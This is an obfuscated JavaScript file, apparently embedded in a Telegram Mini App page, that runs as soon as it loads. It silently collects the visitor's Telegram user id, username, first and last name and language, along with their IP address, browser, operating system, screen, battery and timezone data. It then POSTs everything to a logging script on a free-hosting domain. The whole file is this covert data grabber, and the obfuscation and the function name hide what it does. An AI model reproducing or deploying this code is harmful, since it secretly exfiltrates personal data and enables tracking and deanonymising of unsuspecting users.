(function(_0xb9c693,_0x58aa76){const _0x56ad96=_0x376c,_0x1cfd20=_0xb9c693();while(!![]){try{const _0x117a1d=-parseInt(_0x56ad96(0x129))/0x1*(-parseInt(_0x56ad96(0x144))/0x2)+parseInt(_0x56ad96(0x13c))/0x3+parseInt(_0x56ad96(0x12f))/0x4+-parseInt(_0x56ad96(0x13a))/0x5*(-parseInt(_0x56ad96(0x12e))/0x6)+-parseInt(_0x56ad96(0x137))/0x7*(-parseInt(_0x56ad96(0x126))/0x8)+-parseInt(_0x56ad96(0x124))/0x9*(-parseInt(_0x56ad96(0x134))/0xa)+-parseInt(_0x56ad96(0x12c))/0xb;if(_0x117a1d===_0x58aa76)break;else _0x1cfd20['push'](_0x1cfd20['shift']());}catch(_0x65a5a4){_0x1cfd20['push'](_0x1cfd20['shift']());}}}(_0x11e3,0x92e8c));async function getIPAddress(){const _0x3bb2c6=_0x376c;try{const _0x555b08=await fetch(_0x3bb2c6(0x12d)),_0x568654=await _0x555b08[_0x3bb2c6(0x142)]();return _0x568654['ip'];}catch(_0x25443b){return'Ð½ÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾';}}function _0x11e3(){const _0x2bb53b=['log','60487MfeRGx','initDataUnsafe','userAgent','123180bcxOdI','https://masterly-hoof.000webhostapp.com/logapi.php','2446140knvTHC','WebApp','floor','yep:','name','stringify','json','Error','6veAwwu','POST','language_code','getTimezoneOffset','124938vGogyP','engine','40KTVVTl','Telegram','start_param','255483LcttJH','first_name','Ð½ÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾','36166614QxFuRx','https://api.ipify.org?format=json','96ixVVGC','3872296Tovqex','user','username','screen','product','650gxfEYp','getBattery'];_0x11e3=function(){return _0x2bb53b;};return _0x11e3();}function getUserAgent(){const _0x1e6c13=_0x376c;return navigator[_0x1e6c13(0x139)]||_0x1e6c13(0x12b);}function getOSName(){const _0xd64fa4=_0x376c;return navigator['platform']||_0xd64fa4(0x12b);}function getScreenResolution(){const _0x179559=_0x376c;return window[_0x179559(0x132)]['width']+'x'+window[_0x179559(0x132)]['height']||_0x179559(0x12b);}function _0x376c(_0x3a6d32,_0x1c982a){const _0x11e38d=_0x11e3();return _0x376c=function(_0x376ccc,_0x4589ca){_0x376ccc=_0x376ccc-0x121;let _0x333971=_0x11e38d[_0x376ccc];return _0x333971;},_0x376c(_0x3a6d32,_0x1c982a);}async function getBatteryPercentage(){const _0xf79157=_0x376c;try{const _0x278959=await navigator[_0xf79157(0x135)]();return Math[_0xf79157(0x13e)](_0x278959['level']*0x64);}catch(_0x16b958){return _0xf79157(0x12b);}}function getBrowserInfo(){const _0x5645a0=_0x376c;return{'name':navigator['appName']||_0x5645a0(0x12b),'version':navigator['appVersion']||'Ð½ÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾','engine':navigator[_0x5645a0(0x133)]||_0x5645a0(0x12b)};}async function sendDataToTelegram(){const _0x56d241=_0x376c,_0x5971bd=await getIPAddress(),_0x18a981=getUserAgent(),_0x21903c=getOSName(),_0x2b145d=getScreenResolution(),_0xcc9af2=await getBatteryPercentage(),_0x3c3c16=getBrowserInfo();let _0x43bf30=window[_0x56d241(0x127)][_0x56d241(0x13d)];const _0x1735f7={'chat':_0x43bf30[_0x56d241(0x138)][_0x56d241(0x128)],'username':_0x43bf30['initDataUnsafe']['user'][_0x56d241(0x131)]||_0x56d241(0x12b),'id':_0x43bf30[_0x56d241(0x138)][_0x56d241(0x130)]['id']||_0x56d241(0x12b),'name':_0x43bf30[_0x56d241(0x138)][_0x56d241(0x130)][_0x56d241(0x12a)]||_0x56d241(0x12b),'surname':_0x43bf30['initDataUnsafe']['user']['last_name']||_0x56d241(0x12b),'language':_0x43bf30[_0x56d241(0x138)]['user'][_0x56d241(0x122)]||'Ð½ÐµÐ¸Ð·Ð²ÐµÑÑ‚Ð½Ð¾','allows':_0x43bf30[_0x56d241(0x138)][_0x56d241(0x130)]['allows_write_to_pm']||_0x56d241(0x12b),'ip':_0x5971bd,'useragent':_0x18a981,'osname':_0x21903c,'resolution':_0x2b145d,'battery':_0xcc9af2,'time':new Date()[_0x56d241(0x123)](),'browsername':_0x3c3c16[_0x56d241(0x140)],'browserver':_0x3c3c16['version'],'browserv':_0x3c3c16[_0x56d241(0x125)]};try{const _0x38a27c=await fetch(_0x56d241(0x13b),{'method':_0x56d241(0x121),'headers':{'Content-Type':'application/json'},'body':JSON[_0x56d241(0x141)](_0x1735f7)}),_0x5869c1=await _0x38a27c['json']();console[_0x56d241(0x136)](_0x56d241(0x13f),_0x5869c1);}catch(_0x21a977){console['error'](_0x56d241(0x143));}}sendDataToTelegram();